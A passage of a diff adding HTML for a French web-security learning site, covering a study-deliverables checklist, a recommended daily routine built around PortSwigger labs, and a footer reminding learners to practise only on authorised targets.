+                  <span
+                    ><strong>Portfolio complet</strong> : 8-10 writeups
+                    organisés</span
+                  >
+                </label>
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w8-del-3" />
+                  <span
+                    ><strong>Cheat sheet perso</strong> : ta méthodologie de
+                    test web</span
+                  >
+                </label>
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w8-del-4" />
+                  <span><strong>10 labs refaits</strong> sans aide</span>
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ROUTINE QUOTIDIENNE -->
+    <section class="section section-dark" id="routine">
+      <div class="container">
+        <div class="routine-card">
+          <h2>⏰ Routine Quotidienne Recommandée</h2>
+          <p class="routine-desc">Structure type pour une session de 1-2h</p>
+
+          <div class="routine-timeline">
+            <div class="routine-item">
+              <div class="routine-time">10 min</div>
+              <div class="routine-content">
+                <h4>📖 Lecture</h4>
+                <p>Concept du jour (PortSwigger, article, documentation)</p>
+              </div>
+            </div>
+            <div class="routine-item">
+              <div class="routine-time">45-60 min</div>
+              <div class="routine-content">
+                <h4>🔬 Labs</h4>
+                <p>Pratique sur PortSwigger ou cible locale</p>
+              </div>
+            </div>
+            <div class="routine-item">
+              <div class="routine-time">10-20 min</div>
+              <div class="routine-content">
+                <h4>📝 Notes</h4>
+                <p>Capture des requêtes + "ce que j'ai appris aujourd'hui"</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="routine-tips">
+            <div class="tip-item">
+              <span class="tip-icon">🌍</span>
+              <p>
+                <strong>Écris en anglais</strong> si tu vises l'international
+                (même si tu apprends en français)
+              </p>
+            </div>
+            <div class="tip-item">
+              <span class="tip-icon">📅</span>
+              <p>
+                <strong>Session longue le week-end</strong> (3-4h) pour les
+                projets et writeups
+              </p>
+            </div>
+            <div class="tip-item">
+              <span class="tip-icon">🔄</span>
+              <p>
+                <strong>Consistance > Intensité</strong> : 1h/jour vaut mieux
+                que 7h le dimanche
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- CTA FINAL -->
+    <section class="section">
+      <div class="container">
+        <div class="final-cta">
+          <h2>🎯 Prêt à commencer ?</h2>
+          <p>Tu as tout ce qu'il faut. Maintenant, c'est à toi de jouer.</p>
+          <div class="cta-buttons">
+            <a href="outils.html" class="btn btn-secondary">
+              <span>🔧</span> Voir les outils
+            </a>
+            <a
+              href="https://portswigger.net/web-security"
+              target="_blank"
+              class="btn btn-primary btn-large"
+            >
+              <span>🚀</span> Commencer les labs PortSwigger
+            </a>
+            <a href="cheatsheets.html" class="btn btn-secondary">
+              <span>📋</span> Cheat sheets
+            </a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+      <div class="container">
+        <div class="footer-content">
+          <div class="footer-brand">
+            <span class="logo-icon">🛡️</span>
+            <span class="logo-text">WebSec Academy</span>
+          </div>
+          <div class="footer-links">
+            <a href="index.html">Accueil</a>
+            <a href="roadmap.html">Roadmap</a>
+            <a href="javascript-essentials.html">JavaScript</a>
+            <a href="outils.html">Outils</a>
+            <a href="ressources.html">Ressources</a>
+            <a href="cheatsheets.html">Cheat Sheets</a>
+          </div>
+          <p class="footer-note">
+            ⚠️ Pratique uniquement sur des cibles autorisées (labs, bug bounty
+            avec permission)
+          </p>
+        </div>
+      </div>
+    </footer>
+
+    <script src="main.js"></script>
+  </body>
+</html>
